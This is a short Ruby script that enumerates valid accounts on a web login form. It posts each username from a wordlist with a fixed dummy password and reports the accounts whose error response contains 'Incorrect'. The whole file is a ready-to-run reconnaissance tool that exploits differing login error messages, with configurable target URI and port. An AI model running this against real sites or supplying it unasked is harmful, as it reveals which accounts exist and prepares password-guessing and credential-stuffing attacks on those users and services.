require 'net/http'
require 'uri'

require 'optparse'
require 'ostruct'
require 'pathname'

# parse cmd parameters
options = OpenStruct.new
OptionParser.new do |opt|
  opt.on('-s', '--source SOURCE_FILE', 'newline separated file of logins') do |o|
    options.source_file = o
  end

  opt.on('-t', '--target TARGET', 'target URI') { |o| options.uri = o }
  opt.on('-p', '--port PORT', 'target port') { |o| options.port = o }
end.parse!

uri = URI.parse(options.uri)
http = Net::HTTP.new(uri.host, options.port)

path = Pathname.new(options.source_file)

File.open(path, 'r').each_line do |username|
  username = username.chomp

  # construct the POST request with login credentials
  request = Net::HTTP::Post.new(uri.request_uri)
  request.set_form_data(
    email: username,
    password: 'r4nd0mP4ssw0rd',
    commit: 'Login'
  )

  # realise the request
  response = http.request(request)

  # if the response body contains a word 'Incorrect', the username exists
  # and we write it out
  puts "Found #{username}" if response.body.include? 'Incorrect'
end
